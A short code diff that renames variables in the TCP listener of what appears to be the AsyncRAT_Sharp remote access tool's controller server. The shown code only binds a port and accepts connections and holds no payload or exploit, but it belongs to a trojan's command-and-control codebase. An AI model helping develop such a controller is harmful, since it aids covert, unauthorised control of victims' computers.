@@ -15,7 +15,7 @@ namespace AsyncRAT_Sharp.Sockets
         {
             try
             {
-                IPEndPoint IpEndPoint = new IPEndPoint(IPAddress.Any, Convert.ToInt32(port));
+                IPEndPoint ipEndPoint = new IPEndPoint(IPAddress.Any, Convert.ToInt32(port));
                 Server = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                 {
                     SendBufferSize = 50 * 1024,
@@ -23,7 +23,7 @@ namespace AsyncRAT_Sharp.Sockets
                     ReceiveTimeout = -1,
                     SendTimeout = -1,
                 };
-                Server.Bind(IpEndPoint);
+                Server.Bind(ipEndPoint);
                 Server.Listen(30);
                 HandleLogs.Addmsg($"Listenning {port}", Color.Green);
                 Server.BeginAccept(EndAccept, null);
@@ -39,7 +39,7 @@ namespace AsyncRAT_Sharp.Sockets
         {
             try
             {
-                Clients CL = new Clients(Server.EndAccept(ar));
+                Clients client = new Clients(Server.EndAccept(ar));
             }
             finally
             {
